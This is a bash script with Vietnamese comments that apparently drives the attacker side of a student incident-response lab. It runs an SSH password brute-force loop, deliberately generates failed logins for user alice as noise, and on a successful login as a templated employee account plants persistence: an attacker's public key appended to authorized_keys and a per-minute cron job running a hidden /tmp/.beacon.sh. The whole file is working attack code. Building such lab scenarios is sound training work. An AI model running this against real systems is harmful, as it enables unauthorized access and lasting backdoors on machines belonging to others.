#!/bin/bash
# Tan cong: brute-force emp<EMPID>, do trung -> cai cam persistence (SSH key backdoor + cron),
# va DINH KY cai lai -> sinh vien phai CHAN IP moi dut han. Alice bi do that bai (gay nhieu).
TARGET=target
VICTIM=empEMPID
GOODPW=Password123
FAILPW_LIST="123456 admin root toor qwerty letmein 111111 abc123 iloveyou monkey dragon"
BK="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNRXGMHgh57sbtVbThblDy9ISjZ0dXlDeu+hIq4jyKlUMbuO/pf+dRNe0t+y5UDO9CrhPtzvVbKHyvWiIlLqSPgYv4MHU/B7J1n0ML5wo4xwd1Ei8EkNNqGhE/Lc9paN/r3NX9EBkr82Cl5r9zG2pdfokFiRZflToW4lvdckIzOA64p9N1yLfcawfxKb10Zo+WCDo3yB5GBIznKBEN+5flJpmDXtdcf8Iheq1wdGZKmcp1ECXZNbRw+LbKoiho/XfyDNePAiEGGGdo7XisXfEhvP3TCGPZOJpS8Y6shsQdPLKDmQsmF46rw0PLe+yRevrU9zd0Det4AsewngiUyVyl backdoor@attacker"

SSH_OPTS="-o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4"

install_persistence() {
  sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} \
    "mkdir -p ~/.ssh && chmod 700 ~/.ssh; \
     grep -q 'backdoor@attacker' ~/.ssh/authorized_keys 2>/dev/null || echo '$BK' >> ~/.ssh/authorized_keys; \
     printf '#!/bin/bash\n# beacon\n:\n' > /tmp/.beacon.sh && chmod +x /tmp/.beacon.sh; \
     ( crontab -l 2>/dev/null | grep -v '.beacon'; echo '* * * * * /bin/bash /tmp/.beacon.sh' ) | crontab -" \
    2>/dev/null
}

# Cho sshd cua target san sang
for i in $(seq 1 60); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done

# Vong lap tan cong
while true; do
  # Tao nhieu "Failed password" tren alice
  for pw in $FAILPW_LIST; do
    sshpass -p "$pw" ssh $SSH_OPTS alice@${TARGET} true 2>/dev/null
    sleep 1
  done
  # Do trung emp<EMPID> -> dang nhap thanh cong + cai cam persistence
  if sshpass -p "$GOODPW" ssh $SSH_OPTS ${VICTIM}@${TARGET} true 2>/dev/null; then
    install_persistence
  fi
  sleep 20
done
